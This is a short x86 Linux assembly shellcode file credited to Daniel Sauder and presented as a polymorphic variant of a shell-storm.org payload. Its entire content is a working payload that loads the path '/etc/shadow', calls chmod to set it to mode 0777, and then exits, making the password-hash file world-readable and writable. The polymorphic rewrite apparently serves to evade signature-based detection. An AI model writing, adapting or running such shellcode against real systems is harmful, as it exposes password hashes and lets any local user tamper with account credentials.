; Author: Daniel Sauder
; website: govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/
; polymorphic version of:
; http://www.shell-storm.org/shellcode/files/shellcode-590.php

section .text

global _start

_start:
	jmp short call_shellcode
      
shellcode:
	pop ebx
	xor ecx, ecx
	mul ecx
	mov al, 0xf	
	mov cx, 0x1ff
	int 0x80
 	inc eax	
 	int 0x80	

	
call_shellcode:
	call shellcode
	message db "/etc/shadow"
